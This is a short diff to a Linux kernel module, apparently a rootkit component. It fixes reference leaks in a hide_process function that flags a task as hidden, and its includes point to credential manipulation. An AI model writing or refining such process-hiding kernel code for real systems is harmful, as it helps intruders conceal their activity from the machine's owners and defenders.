@@ -5,6 +5,7 @@
 #include <linux/uaccess.h> // copy_from_user
 #include <linux/pid.h> // find_get_pid, put_pid, get_pid_task
 #include <linux/sched.h> // find_task_by_vpid
+#include <linux/sched/task.h> // put_task_struct
 #include <linux/cred.h> // copy_creds, exit_creds
 #include <linux/slab.h> // kmalloc, kfree
 #include <linux/stat.h> // struct kstat
@@ -28,6 +29,8 @@ static int hide_process(unsigned int pid) {
         goto err;
     }
     pid_task->flags |= HIDDEN_PROCESS_FLAG;
+    put_task_struct(pid_task);
+    put_pid(pid_pointer);
     rcu_read_unlock();
     return 0;
 
